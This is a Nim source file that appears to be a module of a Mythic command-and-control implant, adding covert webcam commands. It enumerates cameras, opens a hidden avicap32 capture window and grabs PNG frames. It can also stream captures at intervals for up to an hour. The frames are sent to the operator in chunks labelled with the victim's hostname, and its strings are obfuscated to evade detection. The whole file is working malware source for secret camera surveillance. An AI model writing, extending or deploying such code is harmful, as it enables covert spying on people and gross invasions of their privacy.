import ../utils/debug
import ../utils/strenc
import ../utils/m_responses
import std/[json, strformat, base64, math, times]
when defined(windows):
  import winim/lean
  import pixie

# Windows Video Capture API (avicap32.dll) - same approach as Meterpreter
# Uses WM_CAP messages for simple webcam capture without full DirectShow/MF setup

when defined(windows):
  const
    WM_USER = 0x0400
    WM_CAP_START = WM_USER
    WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10
    WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11
    WM_CAP_GRAB_FRAME_NOSTOP = WM_CAP_START + 61
    WM_CAP_EDIT_COPY = WM_CAP_START + 30
    WS_POPUP = cast[int32](0x80000000'u32)
    CHUNK_SIZE = 512000  # 512KB chunks

  proc capCreateCaptureWindowA(
    lpszWindowName: LPCSTR,
    dwStyle: DWORD,
    x: int32, y: int32,
    nWidth: int32, nHeight: int32,
    hWnd: HWND,
    nID: int32
  ): HWND {.stdcall, dynlib: "avicap32.dll", importc.}

  proc capGetDriverDescriptionA(
    wDriverIndex: UINT,
    lpszName: LPSTR,
    cbName: int32,
    lpszVer: LPSTR,
    cbVer: int32
  ): WINBOOL {.stdcall, dynlib: "avicap32.dll", importc.}

  proc getHostname(): string =
    var buffer: array[256, WCHAR]
    var size: DWORD = 256
    if GetComputerNameW(cast[LPWSTR](addr buffer[0]), addr size) != 0:
      return $cast[WideCString](addr buffer[0])
    return "unknown"

  proc enumerateWebcams*(): seq[tuple[index: int, name: string, version: string]] =
    ## Enumerate available webcam devices using avicap32
    result = @[]
    var nameBuf: array[256, char]
    var verBuf: array[256, char]
    for i in 0 ..< 10:
      zeroMem(addr nameBuf[0], 256)
      zeroMem(addr verBuf[0], 256)
      if capGetDriverDescriptionA(i.UINT, cast[LPSTR](addr nameBuf[0]), 256,
                                   cast[LPSTR](addr verBuf[0]), 256) != 0:
        result.add((index: i, name: $cast[cstring](addr nameBuf[0]),
                     version: $cast[cstring](addr verBuf[0])))

  proc captureWebcamFrame*(deviceIndex: int): seq[byte] =
    ## Capture a single frame from the specified webcam device
    ## Returns PNG-encoded image data
    result = @[]

    # Create a hidden capture window
    let hCapWnd = capCreateCaptureWindowA(
      cast[LPCSTR](cstring"WebcamCapture"),
      WS_POPUP,
      0, 0, 640, 480,
      0, 0
    )
    if hCapWnd == 0:
      debug "[DEBUG] Failed to create capture window"
      return

    defer:
      DestroyWindow(hCapWnd)

    # Connect to the specified camera device
    if SendMessageA(hCapWnd, WM_CAP_DRIVER_CONNECT, deviceIndex, 0) == 0:
      debug "[DEBUG] Failed to connect to camera device ", deviceIndex
      return

    defer:
      discard SendMessageA(hCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)

    # Allow camera to warm up
    Sleep(500)

    # Grab a single frame
    if SendMessageA(hCapWnd, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0) == 0:
      debug "[DEBUG] Failed to grab frame from camera"
      return

    # Copy frame to clipboard
    discard SendMessageA(hCapWnd, WM_CAP_EDIT_COPY, 0, 0)

    # Get the image from the clipboard
    if OpenClipboard(0) == 0:
      debug "[DEBUG] Failed to open clipboard for webcam frame"
      return

    defer:
      CloseClipboard()

    let hBitmap = GetClipboardData(CF_BITMAP)
    if hBitmap == 0:
      debug "[DEBUG] No bitmap data in clipboard after webcam capture"
      return

    # Get bitmap dimensions
    var bm: BITMAP
    if GetObjectA(hBitmap, int32(sizeof(BITMAP)), cast[LPVOID](addr bm)) == 0:
      debug "[DEBUG] Failed to get bitmap object"
      return

    let width = bm.bmWidth
    let height = bm.bmHeight

    if width <= 0 or height <= 0:
      debug "[DEBUG] Invalid bitmap dimensions: ", width, "x", height
      return

    # Create a pixie image
    var image = newImage(width, height)

    # Get bitmap bits via GetDIBits
    let hScreen = GetDC(0)
    let hDC = CreateCompatibleDC(hScreen)

    var bmi: BITMAPINFO
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER).DWORD
    bmi.bmiHeader.biWidth = width
    bmi.bmiHeader.biHeight = height  # bottom-up
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    bmi.bmiHeader.biCompression = BI_RGB

    var pixelData = newSeq[byte](width * height * 4)
    discard GetDIBits(hDC, hBitmap, 0, height.UINT,
                      cast[pointer](addr pixelData[0]), addr bmi, DIB_RGB_COLORS)

    DeleteDC(hDC)
    ReleaseDC(0, hScreen)

    # Copy into pixie image (BGRA -> RGBA, flip vertically)
    for y in 0 ..< height:
      for x in 0 ..< width:
        let srcIdx = ((height - 1 - y) * width + x) * 4
        let dstIdx = (y * width + x)
        if srcIdx + 3 < pixelData.len and dstIdx < image.data.len:
          image.data[dstIdx].r = pixelData[srcIdx + 2]
          image.data[dstIdx].g = pixelData[srcIdx + 1]
          image.data[dstIdx].b = pixelData[srcIdx + 0]
          image.data[dstIdx].a = 255

    # Encode as PNG
    result = cast[seq[byte]](image.encodeImage(PngFormat))

proc webcamList*(taskId: string, params: JsonNode): JsonNode =
  ## List available webcam devices
  when defined(windows):
    try:
      let devices = enumerateWebcams()
      if devices.len == 0:
        return mythicSuccess(taskId, obf("No webcam devices found."))

      var output = obf("Available Webcam Devices:\n")
      output.add(obf("========================\n"))
      for dev in devices:
        output.add(&"  [{dev.index}] {dev.name}")
        if dev.version.len > 0:
          output.add(&" (Version: {dev.version})")
        output.add("\n")
      output.add(&"\n{devices.len}" & obf(" device(s) found."))

      return mythicSuccess(taskId, output)
    except Exception as e:
      return mythicError(taskId, obf("Error enumerating webcam devices: ") & e.msg)
  else:
    return mythicError(taskId, obf("webcam_list is only available on Windows"))

proc webcamSnap*(taskId: string, params: JsonNode): JsonNode =
  ## Capture a single photo from a webcam and initiate download to Mythic
  when defined(windows):
    try:
      var deviceIndex = 0
      if params.hasKey(obf("device_index")):
        deviceIndex = params[obf("device_index")].getInt()

      debug &"[DEBUG] Capturing webcam frame from device {deviceIndex}"

      let frameData = captureWebcamFrame(deviceIndex)
      if frameData.len == 0:
        return mythicError(taskId, obf("Failed to capture webcam frame. Device may not be available or connected."))

      let totalChunks = int((frameData.len.float / CHUNK_SIZE.float).ceil)
      debug &"[DEBUG] Webcam frame captured: {frameData.len} bytes, {totalChunks} chunks"

      let downloadResponse = %*{
        obf("total_chunks"): totalChunks,
        obf("full_path"): "",
        obf("host"): getHostname(),
        obf("filename"): "",
        obf("is_screenshot"): true,
        obf("chunk_size"): CHUNK_SIZE
      }

      return %*{
        obf("task_id"): taskId,
        obf("download"): downloadResponse,
        obf("screenshot_data"): encode(frameData)
      }
    except Exception as e:
      return mythicError(taskId, obf("Failed to capture webcam: ") & e.msg)
  else:
    return mythicError(taskId, obf("webcam_snap is only available on Windows"))

proc processWebcamSnapChunk*(taskId: string, fileId: string, data: seq[byte], chunkNum: int): JsonNode =
  ## Process a single chunk of the webcam snap data
  try:
    let offset = (chunkNum - 1) * CHUNK_SIZE
    let endPos = min(offset + CHUNK_SIZE, data.len)
    let chunkSize = endPos - offset

    var chunkData = newSeq[byte](chunkSize)
    copyMem(addr chunkData[0], unsafeAddr data[offset], chunkSize)

    let encodedChunk = encode(chunkData)

    let chunkResponse = %*{
      obf("chunk_num"): chunkNum,
      obf("file_id"): fileId,
      obf("chunk_data"): encodedChunk,
      obf("chunk_size"): chunkSize
    }

    return %*{
      obf("task_id"): taskId,
      obf("download"): chunkResponse
    }
  except Exception as e:
    return mythicError(taskId, obf("Error processing webcam chunk ") & $chunkNum & ": " & e.msg)

proc completeWebcamSnap*(taskId: string, fileId: string): JsonNode =
  ## Complete the webcam snap task
  return mythicSuccess(taskId, fileId)

# ---- Webcam Stream (monitoring task) ----

type
  WebcamStreamArgs = object
    duration: int
    interval: int
    device_index: int

  WebcamStreamState* = object
    startTime: float
    endTime: float
    interval: int
    deviceIndex: int
    lastCaptureTime: float
    captureCount: int
    pendingData: seq[byte]  # Pending frame data for chunked transfer
    pendingFileId: string
    pendingTotalChunks: int
    pendingCurrentChunk: int
    awaitingFileId: bool  # Waiting for Mythic to assign file_id

var webcamStreamActive* = false
var webcamStreamState*: WebcamStreamState

proc webcamStream*(taskId: string, params: JsonNode): JsonNode =
  ## Start streaming webcam captures at an interval for a duration
  when defined(windows):
    try:
      let args = to(params, WebcamStreamArgs)

      if args.duration < 1 or args.duration > 3600:
        return mythicError(taskId, obf("Duration must be between 1 and 3600 seconds"))

      if args.interval < 1 or args.interval > 60:
        return mythicError(taskId, obf("Interval must be between 1 and 60 seconds"))

      if webcamStreamActive:
        return mythicError(taskId, obf("Webcam stream is already running"))

      # Verify device is available
      let devices = enumerateWebcams()
      var found = false
      for dev in devices:
        if dev.index == args.device_index:
          found = true
          break
      if not found:
        return mythicError(taskId, obf("Device index ") & $args.device_index & obf(" not found. Use webcam_list to see available devices."))

      debug &"[DEBUG] Starting webcam stream: device={args.device_index}, duration={args.duration}s, interval={args.interval}s"

      webcamStreamState = WebcamStreamState(
        startTime: epochTime(),
        endTime: epochTime() + float(args.duration),
        interval: args.interval,
        deviceIndex: args.device_index,
        lastCaptureTime: 0,
        captureCount: 0,
        pendingData: @[],
        pendingFileId: "",
        pendingTotalChunks: 0,
        pendingCurrentChunk: 0,
        awaitingFileId: false
      )

      webcamStreamActive = true

      let msg = obf("Webcam stream started: capturing every ") & $args.interval &
                obf("s for ") & $args.duration & obf("s from device ") & $args.device_index
      return %*{
        obf("task_id"): taskId,
        obf("completed"): false,
        obf("status"): obf("processing"),
        obf("user_output"): msg
      }
    except Exception as e:
      return mythicError(taskId, obf("Error starting webcam stream: ") & e.msg)
  else:
    return mythicError(taskId, obf("webcam_stream is only available on Windows"))

proc checkWebcamStream*(taskId: string): JsonNode =
  ## Check webcam stream status and capture new frames when interval elapses.
  ## Returns download initiation for each new frame, or completion when duration ends.
  when defined(windows):
    if not webcamStreamActive:
      return nil

    let now = epochTime()

    # Check if duration has elapsed
    if now >= webcamStreamState.endTime:
      webcamStreamActive = false
      let msg = obf("Webcam stream completed. Total captures: ") & $webcamStreamState.captureCount
      return mythicSuccess(taskId, msg)

    # Check if it's time for a new capture
    if now - webcamStreamState.lastCaptureTime >= float(webcamStreamState.interval):
      webcamStreamState.lastCaptureTime = now

      let frameData = captureWebcamFrame(webcamStreamState.deviceIndex)
      if frameData.len == 0:
        # Frame capture failed, report but keep going
        return %*{
          obf("task_id"): taskId,
          obf("completed"): false,
          obf("status"): obf("processing"),
          obf("user_output"): obf("Warning: Failed to capture frame #") & $(webcamStreamState.captureCount + 1)
        }

      webcamStreamState.captureCount += 1
      let totalChunks = int((frameData.len.float / CHUNK_SIZE.float).ceil)

      debug &"[DEBUG] Webcam stream capture #{webcamStreamState.captureCount}: {frameData.len} bytes, {totalChunks} chunks"

      # Store pending data for chunked transfer
      webcamStreamState.pendingData = frameData
      webcamStreamState.pendingTotalChunks = totalChunks
      webcamStreamState.pendingCurrentChunk = 0
      webcamStreamState.awaitingFileId = true

      let downloadResponse = %*{
        obf("total_chunks"): totalChunks,
        obf("full_path"): "",
        obf("host"): getHostname(),
        obf("filename"): "",
        obf("is_screenshot"): true,
        obf("chunk_size"): CHUNK_SIZE
      }

      return %*{
        obf("task_id"): taskId,
        obf("download"): downloadResponse
      }

    return nil
  else:
    return nil
